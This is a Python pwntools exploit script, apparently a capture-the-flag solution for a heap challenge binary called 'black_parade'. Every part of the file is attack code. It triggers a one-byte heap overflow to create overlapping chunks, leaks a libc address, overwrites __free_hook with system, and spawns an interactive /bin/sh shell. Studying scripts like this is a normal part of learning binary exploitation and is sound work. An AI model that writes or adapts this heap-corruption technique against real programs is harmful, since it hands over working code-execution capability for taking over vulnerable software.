from pwn import *

def add(option, pay):
    p.sendlineafter('>', '2')
    p.sendlineafter('>', str(option))
    p.sendlineafter('>', pay)

def free(idx):
    p.sendlineafter('>', '3')
    p.sendlineafter('>', str(idx))

def view():
    p.sendlineafter('>', '1')


p = process('./black_parade')
e = ELF('./black_parade')
l = e.libc

"""
add(1, 'a'*0x8) # malloc(0x10), 1-byte overflow
add(2, 'a'*0x8) # malloc(0x30)
add(3, 'a'*0x8) # malloc(0xb0)
add(4, 'a'*0x8) # malloc(0x50)
add(5, 'a'*0x8) # malloc(0xb0)
add(6, 'a'*0x8) # malloc(0x50)
"""

#context.log_level = 'debug'

add(1, 'a') # 0
for i in range(4):
    add(5, 'a')
for i in range(3):
    add(3, 'a')

for i in range(1, 8):
    free(i)

free(0)
add(1, 'a'*0x17+'\xc1')
free(1)
view()

libc = u64('\x00'+p.recvuntil('\x7f')[-5:].ljust(7, '\x00')) - 0x1e4c00
print hex(libc)

add(4, 'a') # 9
add(2, 'a')
free(9)
free(0)
add(1, 'a'*0x17+'\x61')
free(9)

add(4, p64((libc+l.sym['__free_hook'])>>8))
add(6, ';/bin/sh\x00')
add(6, '\x00'*3+p32(1)+p64(libc+0x1ec540)+p64(0)+p64(libc+l.sym['system']))

p.interactive()